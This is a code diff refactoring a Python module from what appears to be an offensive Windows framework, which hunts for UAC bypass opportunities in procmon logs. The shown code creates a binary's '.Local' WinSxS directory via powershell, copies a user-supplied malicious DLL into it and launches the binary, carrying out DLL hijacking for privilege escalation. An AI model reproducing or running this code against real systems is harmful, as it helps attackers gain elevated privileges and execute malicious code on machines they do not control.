@@ -12,46 +12,40 @@ class CustomModule(Module):
                        "Author": "Santiago Hernandez Ramos"}
 
         # -----------name-----default_value--description
-        options = {"binary": [None, "Target of the UAC fileless bypass search"],
-                   "xml_file": [None, "Path to a procmon like XML file"],
-                   "malicious_dll": [None, "Path to a malicious_dll to insert"]}
+        options = {"binary": [None, "Target of the UAC fileless bypass search", True],
+                   "xml_file": [None, "Path to a procmon like XML file", True],
+                   "malicious_dll": [None, "Path to a malicious_dll to insert", True]}
 
         # Constructor of the parent class
         super(CustomModule, self).__init__(information, options)
 
         # Class atributes, initialization in the run_module method
         # after the user has set the values
-        self._xml = None
-        self._binary = None
         self._results = {"vulnerables": [], "sospechosos": []}
         self.p = None
         self.events = None
         self.events_nf = None
-        self._malicious_dll = None
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        # To access user provided attributes, use self.options dictionary
-        self._xml = self.options["xml_file"][0]
-        self._binary = self.options["binary"][0]
-        self._malicious_dll = self.options["malicious_dll"][0]
-
-        self.p = Xml_parser()
-        # Initializating the options of the module
-        self.p.parse_tree(self._xml)
+        self.init_import_modules()
 
         self.events = self.p.events()
         self.events_nf = self.p.events_notfound(self.events)
 
-        print "\n[*] Analizing binary: " + str(self._binary)
+        print "\n[*] Analizing binary: " + str(self.args["binary"])
         nf = self.events_nf_operation()
         paths = self.p.paths(nf)
         for p in paths:
             print p
-            if self._binary + ".Local" in p:
-                self.handle_dll_local(p, self._binary)
+            if self.args["binary"] + ".Local" in p:
+                self.handle_dll_local(p, self.args["binary"])
 
         self.results()
+
+    def init_import_modules(self):
+        self.p = Xml_parser()
+        self.p.set_value("xml_path", self.args["xml_file"])
 
     def handle_dll_local(self, subpath, binary):
         path = subpath + "\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.15063.0_none_583b8639f462029f\\"
@@ -66,7 +60,7 @@ class CustomModule(Module):
                 ["powershell", "-C", "mkdir", path])
 
             subprocess.check_call(
-                ["powershell", "-C", "cp", self._malicious_dll, path])
+                ["powershell", "-C", "cp", self.args["malicious_dll"], path])
 
             prev_pids = psutil.pids()
             subprocess.check_call(["powershell", "-C", binary])
@@ -121,5 +115,6 @@ class CustomModule(Module):
             pass
 
     def events_nf_operation(self):
-        events_proc = self.p.events_proc_name(self._binary, self.events_nf)
+        events_proc = self.p.events_proc_name(
+            self.args["binary"], self.events_nf)
         return self.p.events_operation("CreateFile", events_proc)
